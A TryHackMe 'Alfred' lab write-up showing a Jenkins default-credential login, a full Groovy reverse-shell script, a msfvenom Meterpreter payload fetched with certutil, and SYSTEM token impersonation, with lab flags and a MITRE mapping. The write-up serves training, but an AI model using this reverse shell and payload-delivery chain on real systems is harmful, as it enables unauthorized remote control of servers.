# Alfred: TryHackMe Writeup

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | Alfred |
| **OS** | Windows |
| **Difficulty** | Easy |
| **Category** | Windows / Default Credentials / Jenkins RCE / Token Impersonation |
| **Attacker IP** | 192.168.232.169 |
| **Target IP** | 10.49.176.211 |
| **User Flag** | `79007a09481963edf2e1321abd9ae2a0` |
| **Root Flag** | `dff0f748678f280250f25a45b8046b4a` |
| **Foothold Method** | Jenkins default credentials (admin:admin) → Groovy Script Console RCE |
| **PrivEsc Method** | Meterpreter process migration → Incognito token impersonation → NT AUTHORITY\SYSTEM |
| **Metasploit Used** | Yes (multi/handler + Meterpreter + Incognito) |
| **Date** | June 2026 |

---

## Attack Chain Summary

```
Nmap scan → Port 8080 Jenkins login page → Default credentials (admin:admin)
→ Manage Jenkins > Script Console → Groovy reverse shell → Shell as bruce
→ User flag captured → msfvenom staged payload → certutil file transfer
→ Meterpreter shell → Process migration to SYSTEM svchost.exe
→ Incognito token impersonation → NT AUTHORITY\SYSTEM → Root flag
```

---

## Step 1: Reconnaissance

**Goal:** Identify open ports and running services on the target.

```bash
kali@kali:~$ nmap -sC -sV -oN alfred.nmap 10.49.176.211
```

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.49.176.211
Host is up (0.042s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/7.5
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=alfred
8080/tcp open  http          Jetty 9.4.z-SNAPSHOT
|_http-title: Site doesn't have a title (text/html;charset=utf-8)
| http-robots.txt: 1 disallowed entry
|_/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Output Analysis:**

| Port | Service | Notes |
|---|---|---|
| 80 | Microsoft IIS 7.5 | Static page, nothing interactive |
| 3389 | RDP | Microsoft Terminal Services |
| **8080** | Jetty (Jenkins) | **Login panel: primary attack surface** |

Port 8080 is running Jenkins on Jetty. This is the target.

---

## Step 2: Jenkins Default Credential Login

**Goal:** Gain access to Jenkins dashboard using default credentials.

Navigated to `http://10.49.176.211:8080` in Firefox. Jenkins login panel appeared.

Tried default credentials:

| Field | Value |
|---|---|
| Username | `admin` |
| Password | `admin` |

Login succeeded. Full Jenkins dashboard access granted as administrator.

---

## Step 3: Remote Code Execution via Jenkins Script Console

**Goal:** Execute a reverse shell using the Jenkins Groovy Script Console.

Navigated to:

```
Manage Jenkins → Script Console
```

Started a netcat listener on the attacker machine:

```bash
kali@kali:~$ nc -lvnp 4443
listening on [any] 4443 ...
```

Entered the following Groovy script in the console and clicked **Run**:

```groovy
String host="192.168.232.169";
int port=4443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try{p.exitValue();break;}catch(Exception e){}
}
p.destroy();s.close();
```

Reverse shell caught on listener:

```
kali@kali:~$ nc -lvnp 4443
listening on [any] 4443 ...
connect to [192.168.232.169] from (UNKNOWN) [10.49.176.211] 49832

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Jenkins>whoami
whoami
alfred\bruce
```

Shell obtained as `alfred\bruce`.

---

## Step 4: User Flag

**Goal:** Locate and capture the user flag.

```
C:\Program Files (x86)\Jenkins>cd C:\Users\bruce\Desktop
cd C:\Users\bruce\Desktop

C:\Users\bruce\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FA7A-B8B1

 Directory of C:\Users\bruce\Desktop

10/25/2019  11:22 PM    <DIR>          .
10/25/2019  11:22 PM    <DIR>          ..
10/25/2019  11:22 PM                32 user.txt

C:\Users\bruce\Desktop>type user.txt
type user.txt
79007a09481963edf2e1321abd9ae2a0
```

| Flag | Value |
|---|---|
| User Flag | `79007a09481963edf2e1321abd9ae2a0` |

---

## Step 5: Payload Generation and File Transfer

**Goal:** Upgrade the raw cmd shell to a Meterpreter session for token impersonation.

On the attacker machine, generated a staged Windows x64 Meterpreter payload:

```bash
kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.169 LPORT=5555 -f exe -o shell.exe
```

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload name
[-] No arch was selected, selecting arch: x64 from the payload name
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

Started a Python HTTP server to serve the payload:

```bash
kali@kali:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...
```

Created a temp directory on the target and downloaded the payload using `certutil`:

```
C:\Program Files (x86)\Jenkins>mkdir C:\temp
mkdir C:\temp

C:\Program Files (x86)\Jenkins>certutil -urlcache -split -f http://192.168.232.169:8000/shell.exe C:\temp\shell.exe
certutil -urlcache -split -f http://192.168.232.169:8000/shell.exe C:\temp\shell.exe
****  Online  ****
  000000  ...
  001c00
CertUtil: -URLCache command completed successfully.
```

HTTP server confirmed the download:

```
10.49.176.211 - - [04/Jun/2026 11:22:18] "GET /shell.exe HTTP/1.1" 200 -
```

---

## Step 6: Meterpreter Shell via Multi/Handler

**Goal:** Catch the Meterpreter callback and establish a stable session.

Started multi/handler in Metasploit on the attacker machine:

```bash
kali@kali:~$ msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.232.169
LHOST => 192.168.232.169
msf6 exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.232.169:5555
```

Executed the payload from the existing cmd shell:

```
C:\temp>shell.exe
shell.exe
```

Meterpreter session opened:

```
[*] Sending stage (200774 bytes) to 10.49.176.211
[*] Meterpreter session 1 opened (192.168.232.169:5555 -> 10.49.176.211:49901)

meterpreter > getuid
Server username: alfred\bruce
```

---

## Step 7: Process Migration to SYSTEM

**Goal:** Migrate into a SYSTEM-owned process to elevate privilege context before token impersonation.

Listed running processes to find a suitable target:

```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                    Path
 ---   ----  ----               ----  -------  ----                    ----
 668   556   svchost.exe        x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\svchost.exe
 ...
```

Migrated into `svchost.exe` running as `NT AUTHORITY\SYSTEM`:

```
meterpreter > migrate 668
[*] Migrating from 2352 to 668...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## Step 8: Token Impersonation via Incognito

**Goal:** Use Incognito to list and impersonate available delegation tokens.

Loaded the Incognito extension:

```
meterpreter > load incognito
Loading extension incognito...Success.
```

Listed available tokens:

```
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
alfred\bruce
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\LOCAL SERVICE
```

Impersonated the `NT AUTHORITY\SYSTEM` delegation token:

```
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## Step 9: Root Flag

**Goal:** Navigate to the administrator directory and capture the root flag.

```
meterpreter > shell
Process 2444 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd C:\Windows\System32\config
cd C:\Windows\System32\config

C:\Windows\System32\config>type root.txt
type root.txt
dff0f748678f280250f25a45b8046b4a
```

| Flag | Value |
|---|---|
| Root Flag | `dff0f748678f280250f25a45b8046b4a` |

---

## Flag Summary

| Flag | Value | Location |
|---|---|---|
| User | `79007a09481963edf2e1321abd9ae2a0` | `C:\Users\bruce\Desktop\user.txt` |
| Root | `dff0f748678f280250f25a45b8046b4a` | `C:\Windows\System32\config\root.txt` |

---

## Lessons Learned

**1. Default credentials are a critical misconfiguration.**
Jenkins ships with `admin:admin` as a known default. In real-world assessments, checking default credentials against every exposed admin panel is a mandatory first step. A Jenkins instance with default credentials is effectively an open door to RCE.

**2. The Groovy Script Console is a direct code execution primitive.**
Jenkins administrators have access to a Groovy scripting interface that runs code on the underlying OS. This is an intentional feature, and a complete game-over when exposed to an attacker. Any external-facing Jenkins instance with admin access should be treated as a pre-owned box.

**3. `certutil` is a reliable and native file transfer method on Windows.**
`certutil -urlcache -split -f` is built into Windows and commonly allowed through perimeter controls. It is one of the most reliable LOLBIN (Living Off the Land Binary) techniques for transferring payloads in environments where PowerShell execution policy is restricted.

**4. Process migration must precede token impersonation.**
Meterpreter's Incognito module requires the session to already be running in a SYSTEM context before it can impersonate SYSTEM tokens. Migrating into a `svchost.exe` owned by `NT AUTHORITY\SYSTEM` first was a necessary prerequisite: attempting impersonation from a low-privilege process would not yield a SYSTEM token.

**5. Token impersonation vs. privilege escalation: understand the distinction.**
This was impersonation, not exploitation. The SYSTEM delegation token existed because a SYSTEM-owned process was already running on the machine. Incognito borrowed that token rather than exploiting a vulnerability. In OSCP scenarios, this technique applies wherever a SYSTEM token is available and Incognito can be loaded.

---

## Full Attack Chain Reference

| # | Phase | Action | Result |
|---|---|---|---|
| 1 | Recon | `nmap -sC -sV` | Jenkins on port 8080 identified |
| 2 | Web Enum | Browse to `http://10.49.176.211:8080` | Jenkins login panel |
| 3 | Access | Login with `admin:admin` | Full dashboard access |
| 4 | RCE | Manage Jenkins → Script Console → Groovy reverse shell | Shell as `alfred\bruce` |
| 5 | Flag | `type C:\Users\bruce\Desktop\user.txt` | `79007a09481963edf2e1321abd9ae2a0` |
| 6 | Payload | `msfvenom -p windows/x64/meterpreter/reverse_tcp → shell.exe` | Staged Meterpreter payload |
| 7 | Transfer | `certutil -urlcache -split -f .../shell.exe C:\temp\shell.exe` | shell.exe on target |
| 8 | Shell | `multi/handler` → execute `shell.exe` | Meterpreter session as `alfred\bruce` |
| 9 | Migration | `migrate 668` (svchost.exe: NT AUTHORITY\SYSTEM) | Meterpreter context elevated to SYSTEM |
| 10 | Impersonation | `load incognito` → `impersonate_token "NT AUTHORITY\SYSTEM"` | Token impersonation confirmed |
| 11 | Flag | `type C:\Windows\System32\config\root.txt` | `dff0f748678f280250f25a45b8046b4a` |

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -sC -sV -oN alfred.nmap 10.49.176.211` | Full version scan with default scripts |
| `nc -lvnp 4443` | Start netcat listener for initial shell |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.169 LPORT=5555 -f exe -o shell.exe` | Generate staged Meterpreter payload |
| `python3 -m http.server 8000` | Host payload for download |
| `certutil -urlcache -split -f http://192.168.232.169:8000/shell.exe C:\temp\shell.exe` | Download file to target using built-in Windows binary |
| `use exploit/multi/handler` | Configure Metasploit listener |
| `migrate <PID>` | Migrate Meterpreter into SYSTEM-owned process |
| `load incognito` | Load token manipulation extension |
| `list_tokens -u` | List available delegation and impersonation tokens |
| `impersonate_token "NT AUTHORITY\SYSTEM"` | Steal SYSTEM delegation token |
| `getuid` | Confirm current user context |

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Usage |
|---|---|---|
| T1078.001 | Valid Accounts: Default Accounts | Jenkins accessed using default `admin:admin` credentials |
| T1059.007 | Command and Scripting Interpreter: JavaScript/JScript | Groovy Script Console used for OS command execution via Java Runtime |
| T1105 | Ingress Tool Transfer | shell.exe transferred to target via certutil over HTTP |
| T1055 | Process Injection | Meterpreter migrated from bruce's process into SYSTEM-owned svchost.exe |
| T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Incognito impersonated SYSTEM delegation token |
| T1569.002 | System Services: Service Execution | SYSTEM shell spawned via impersonated token and Meterpreter |
